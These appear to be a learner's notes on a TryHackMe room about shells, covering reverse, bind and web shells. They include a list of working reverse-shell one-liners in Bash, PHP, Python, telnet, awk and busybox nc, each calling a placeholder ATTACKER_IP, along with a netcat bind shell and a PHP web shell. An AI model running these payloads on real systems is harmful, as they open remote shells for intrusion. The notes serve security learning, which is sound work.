
### **TryHackMe: Cyber Security 101**

**Room:** `Shells Overview`  
**Status:** Completed  
**Date:** 2025-08-18

----------

### **Goal**

Understand the concept of shells in computing and cybersecurity, including how attackers use shells for remote access, post-exploitation activities, and different types of shells such as reverse shells, bind shells, and web shells.

---------

### **Key Topics Covered**



### 1. Introduction to Shells

A **shell** is software that allows a user to interact with an operating system (OS). While shells can include graphical interfaces, they are most commonly command-line interfaces (CLI). In cybersecurity, the term “shell” usually refers to a shell session an attacker gains after compromising a system. Through this shell, the attacker can run commands, execute software, and interact with the OS as if logged in locally.

Attackers can use shell access to perform a variety of activities:

-   **Remote System Control:** Execute commands and software on the target system remotely.
    
-   **Privilege Escalation:** If initial access is limited, attackers explore ways to gain elevated or administrative privileges.
    
-   **Data Exfiltration:** Access and copy sensitive data from the system.
    
-   **Persistence and Maintenance Access:** Create new users or backdoor software to maintain access for later use.
    
-   **Post-Exploitation Activities:** Deploy malware, create hidden accounts, or delete information.
    
-   **Pivoting:** Use the compromised system as a stepping stone to access other systems in the network.
    

### 2. Reverse Shells

A **reverse shell** (or “connect-back shell”) is a popular technique for attackers to gain access while bypassing network security measures. The connection originates from the target system back to the attacker’s machine.

**Listener Setup Example Using Netcat:**

    nc -lvnp 443
-   `-l`: listen for incoming connections
    
-   `-v`: verbose mode
    
-   `-n`: use IP addresses only (no DNS resolution)
    
-   `-p`: specify the port
    

Attackers often choose well-known ports (53, 80, 8080, 443, 139, 445) to blend with normal traffic. Once the listener is set, the attacker executes a **payload** on the target system to connect back to the listener.

**Pipe Reverse Shell Example:**

    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
-   `rm -f /tmp/f`: removes any existing named pipe to prevent conflicts
    
-   `mkfifo /tmp/f`: creates a FIFO (first-in-first-out) named pipe
    
-   `cat /tmp/f | sh -i 2>&1`: pipes data through an interactive shell, redirecting errors to output
    
-   `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: sends shell output to the attacker, enabling bi-directional communication
    

This payload exposes the shell to the attacker, who can then execute commands as if logged in locally.

### 3. Bind Shells

A **bind shell** binds a port on the target system and listens for an incoming connection. Unlike reverse shells, the compromised system waits for the attacker to connect. This is useful when outgoing connections are restricted but is more detectable.

**Bind Shell Example Using Netcat:**

    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f

-   `nc -l 0.0.0.0 8080`: listens on all interfaces on port 8080
    
-   Output is sent back through the named pipe for bidirectional communication
    
-   Ports below 1024 require elevated privileges, so 8080 is chosen to avoid this
    

**Attacker Connection Command:**

    nc -nv TARGET_IP 8080

### 4. Alternative Listeners and Tools

Other tools can be used to interact with shells:

-   **Rlwrap:** Provides command history and editing
    
-   **Ncat:** Enhanced Netcat with encryption (SSL)
    
-   **Socat:** Creates socket connections between data sources or hosts
    

### 5. Shell Payloads

Shell payloads are commands or scripts that expose a shell connection. They vary by OS and language.

**Linux Reverse Shell Examples:**

 **Bash Reverse Shells** 

    bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1      # This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP on port 443.The >& operator combines both standard output and standard error.
    exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done   # This reverse shell creates a new file descriptor (5) and connects to a TCP socket. It reads and executes commands from the socket, sending the output back through the same socket.
    0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196   # Uses a file descriptor (196) to establish a TCP connection, reading commands from the network and sending output back through the same connection.
    bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5   # Opens a bash interactive shell using file descriptor 5 for input and output, enabling an interactive session over TCP.

**PHP Reverse Shells**

    php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'   # Creates a socket connection to the attacker's IP on port 443 and executes a shell, redirecting input/output.
    php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'   # Similar to the previous command, but uses the shell_exec function.
    php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'   # Uses the system function to execute the command and output the result to the browser.
    php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'   # Uses passthru to execute a command and send raw output back, useful for binary data.
    php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'   # Uses popen to open a process file pointer, allowing shell execution.

**Python Reverse Shells**

    export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty; s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("bash")'   # Sets remote host/port as environment variables, creates a socket, duplicates socket fd for stdio, and spawns bash.
    PY-C 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("bash")'   # Uses subprocess module to spawn a shell and redirect stdio to the socket.
    PY-C 'import os,pty,socket; s=socket.socket(); s.connect(("ATTACKER_IP",443)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("bash")'   # Creates a socket, connects to the attacker, and redirects input/output/error to the socket.

**Other Reverse Shells** 

    TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF   # Creates a named pipe and connects to the attacker via Telnet on IP/port 443.
    awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null   # Uses AWK's TCP capabilities to connect to ATTACKER_IP:443, read commands, execute, and return results.
    busybox nc ATTACKER_IP 443 -e sh   # BusyBox Netcat connects to attacker at IP:443 and executes /bin/sh, exposing the command line.

### 6. Web Shells

A **web shell** is a script deployed on a compromised web server that executes commands through the server itself. It can be hidden in web applications, making it difficult to detect.

**PHP Web Shell Example:**

    <?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
    ?>

-   Saved as `shell.php` and uploaded via a vulnerability
    
-   Accessed via a URL like `http://victim.com/uploads/shell.php?cmd=whoami`
    
-   Executes the command and returns output in the browser
    

Web shells can be written in PHP, ASP, JSP, or CGI scripts depending on server support.

## What I Learned

-   Shells allow interaction with an OS, commonly via command-line interfaces.
    
-   Reverse shells connect back to the attacker, bypassing firewalls.
    
-   Bind shells wait for incoming connections but are more detectable.
    
-   Netcat, Rlwrap, Ncat, and Socat are useful tools for shell interactions.
    
-   Shell payloads vary by OS and language, including Bash, PHP, and Python.
    
-   Web shells execute commands through a web server and can be hidden in web apps.
